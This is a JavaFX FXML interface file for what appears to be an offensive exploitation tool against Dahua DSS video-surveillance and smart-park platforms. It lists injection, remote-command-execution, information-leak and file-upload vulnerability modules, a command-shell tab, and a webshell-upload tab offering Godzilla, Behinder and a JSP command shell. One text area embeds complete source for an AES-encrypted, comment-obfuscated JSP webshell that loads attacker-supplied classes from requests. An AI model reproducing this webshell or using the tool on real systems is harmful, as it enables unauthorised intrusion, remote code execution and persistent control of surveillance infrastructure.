<?xml version="1.0" encoding="UTF-8"?>

<?import java.lang.String?>
<?import javafx.collections.FXCollections?>
<?import javafx.scene.control.Button?>
<?import javafx.scene.control.ComboBox?>
<?import javafx.scene.control.Label?>
<?import javafx.scene.control.Menu?>
<?import javafx.scene.control.MenuBar?>
<?import javafx.scene.control.MenuItem?>
<?import javafx.scene.control.Tab?>
<?import javafx.scene.control.TabPane?>
<?import javafx.scene.control.TextArea?>
<?import javafx.scene.control.TextField?>
<?import javafx.scene.layout.AnchorPane?>
<?import javafx.scene.text.Font?>

<AnchorPane prefHeight="924.0" prefWidth="1270.0" xmlns="http://javafx.com/javafx/8.0.171" xmlns:fx="http://javafx.com/fxml/1" fx:controller="fc">
   <children>
      <ComboBox fx:id="comboBox" layoutX="399.0" layoutY="60.0" prefHeight="25.0" prefWidth="322.0" promptText="ALL">
         <items>
            <FXCollections fx:factory="observableArrayList">
                <String fx:value="ALL" />
               <String fx:value="大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" />
               <String fx:value="大华DSS数字监控系统远程命令执行漏洞" />
               <String fx:value="大华DSS数字监控系统itcBulletin注入漏洞" />
                <String fx:value="大华智慧园区综合管理平台信息泄露漏洞" />
                <String fx:value="大华智慧园区综合管理平台getNewStaypointDetailQuery注入" />
                <String fx:value="大华智慧园区综合管理平台clientserver注入" />
                <String fx:value="大华DSS user_edit.action信息泄露漏洞" />
                <String fx:value="大华智慧园区综合管理平台poi任意文件上传漏洞" />
            </FXCollections>
         </items>
      </ComboBox>

       <Label layoutX="14.0" layoutY="65.0" text="目标：" />
      <TextField fx:id="test2" layoutX="50.0" layoutY="60.0" prefHeight="25.0" prefWidth="269.0" />
      <Label layoutX="329.0" layoutY="65.0" text="选择模块：" />

      <TabPane layoutX="14.0" layoutY="120.0" prefHeight="700.0" prefWidth="1214.0" tabClosingPolicy="UNAVAILABLE">
        <tabs>
          <Tab text="检测日志">
            <content>
              <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="765.0" prefWidth="1221.0">
                     <children>
                        <TextArea fx:id="test1" editable="false" layoutX="6.0" layoutY="11.0" prefHeight="653.0" prefWidth="1202.0" wrapText="true">
                           <font>
                              <Font size="13.0" />
                           </font></TextArea>
                     </children></AnchorPane>
            </content>
          </Tab>
          <Tab text="Cmdshell">
            <content>
              <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="585.0" prefWidth="1118.0">
                     <children>
                        <TextArea fx:id="cmd" layoutX="8.0" layoutY="74.0" prefHeight="583.0" prefWidth="1182.0" wrapText="true" />
                        <Label layoutX="23.0" layoutY="33.0" text="内置模块:" />

                        <TextField fx:id="test3" layoutX="408.0" layoutY="29.0" prefHeight="23.0" prefWidth="239.0" />
                        <Label layoutX="330.0" layoutY="33.0" text="Cmdshell:" />
                        <Button layoutX="851.0" layoutY="29.0" mnemonicParsing="false" onAction="#rce6" prefHeight="23.0" prefWidth="156.0" text="执行" />
                        <ComboBox layoutX="89.0" layoutY="29.0" prefHeight="23.0" prefWidth="208.0" promptText="大华DSS远程命令执行漏洞" />
                        <Button layoutX="675.0" layoutY="29.0" mnemonicParsing="false" onAction="#re1" prefHeight="23.0" prefWidth="150.0" text="验证" />
                     </children></AnchorPane>
            </content>
          </Tab>
            <Tab text="webshell利用">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <Label layoutX="50.0" layoutY="44.0" />
                        <TextArea layoutX="14.0" layoutY="113.0" prefHeight="536.0" prefWidth="583.0" text="&lt;%! String xc = &quot;5f4dcc3b5aa765d6&quot;;class X extends ClassLoader {public X(ClassLoader z) {super(z); }public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);Class&lt;?&gt; aClass = Class.forName(&quot;javax.crypto.spec.SecretKeySpec&quot;);java.lang.reflect.Constructor&lt;?&gt;constructor = aClass.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec skeySpec = (javax.crypto.spec.SecretKeySpec) constructor.newInstance(xc.getBytes(), &quot;AES&quot;);c.init(m ? 1 : 2, skeySpec);byte[] result = (byte[]) c.getClass()./*Z5T0ynvHb5*/getDeclaredMethod/*Z5T0ynvHb5*/(&quot;doFinal&quot;, new Class[]{byte[].class}).invoke(c, new Object[]{s});return result; } catch (Exception e) {return null;}} %&gt;&lt;%  try {byte[] C707 = new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))]; java.io.InputStream inputStream = request.getInputStream(); int _num = 0; while ((_num += inputStream.read(C707, _num, C707.length)) &lt; C707.length) ; C707 = x(C707, false); if (session.getAttribute(&quot;payload&quot;) == null) {session.setAttribute(&quot;payload&quot;, new X(Thread.currentThread()./*Z5T0ynvHb5*/getContextClassLoader()).Q(C707)); } else {request.setAttribute(&quot;parameters&quot;, C707);Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();f.equals(/*Z5T0ynvHb5*/arrOut);f.equals(/*Z5T0ynvHb5*/pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true)); }} catch (Exception e) {} %&gt;" wrapText="true" />
                        <Button layoutX="922.0" layoutY="47.0" mnemonicParsing="false" onAction="#re" prefHeight="25.0" prefWidth="110.0" text="内置上传" />
                        <Label layoutX="26.0" layoutY="52.0" text="选择模块：" />
                        <TextArea fx:id="cmd1" layoutX="757.0" layoutY="113.0" prefHeight="548.0" prefWidth="436.0" />
                        <Label layoutX="682.0" layoutY="120.0" text="上传日志:" />
                  
                         <ComboBox fx:id="comber" layoutX="97.0" layoutY="48.0" prefHeight="23.0" prefWidth="269.0" promptText="All">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="大华智慧园区综合管理平台poi任意文件上传漏洞" />
                  
                                 </FXCollections>
                             </items>
                         </ComboBox>
                        <Label layoutX="394.0" layoutY="52.0" text="内置webshell：" />
                  
                         <ComboBox fx:id="comboBox2" layoutX="490.0" layoutY="48.0" prefHeight="23.0" prefWidth="223.0" promptText="All">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="Godzilla" />
                                     <String fx:value="Behinder" />
                                     <String fx:value="jspcmdshell" />
                                     <String fx:value="测试文件" />
                                 </FXCollections>
                             </items>
                         </ComboBox>
                        <Button layoutX="757.0" layoutY="48.0" mnemonicParsing="false" onAction="#rce13" prefHeight="23.0" prefWidth="131.0" text="验证" />
                        <Button layoutX="1058.0" layoutY="48.0" mnemonicParsing="false" prefHeight="23.0" prefWidth="107.0" text="自定义上传" />
                     </children></AnchorPane>
               </content>
            </Tab>
            <Tab text="漏洞说明">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0" />
               </content>
            </Tab>
        </tabs>
      </TabPane>
      <Button layoutX="754.0" layoutY="59.0" mnemonicParsing="false" onAction="#rce1" prefHeight="25.0" prefWidth="131.0" text="检测" />
      <Button layoutX="1057.0" layoutY="59.0" mnemonicParsing="false" onAction="#rce3" prefHeight="25.0" prefWidth="123.0" text="清空面板" />
      <Button layoutX="906.0" layoutY="59.0" mnemonicParsing="false" onAction="#rce5" prefHeight="25.0" prefWidth="123.0" text="选择模块" />
      <MenuBar layoutY="1.0" prefHeight="25.0" prefWidth="1248.0">
        <menus>
          <Menu mnemonicParsing="false" text="设置">
            <items>
              <MenuItem mnemonicParsing="false" onAction="#rce4" text="版本" />
            </items>
          </Menu>
        </menus>
      </MenuBar>


   </children>
</AnchorPane>
